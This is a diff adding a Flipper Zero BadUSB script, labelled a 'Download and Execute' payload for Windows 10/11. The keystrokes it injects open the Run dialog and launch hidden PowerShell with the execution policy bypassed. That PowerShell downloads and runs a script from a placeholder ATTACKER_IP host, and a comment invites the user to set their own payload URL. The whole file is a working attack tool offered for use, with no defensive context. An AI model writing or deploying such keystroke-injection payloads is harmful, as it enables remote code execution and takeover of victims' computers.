@@ -1,0 +1,11 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Download and Execute
+REM Target: Windows 10/11
+REM ========================================
+REM CONFIGURE: Change URL to your payload
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
+ENTER
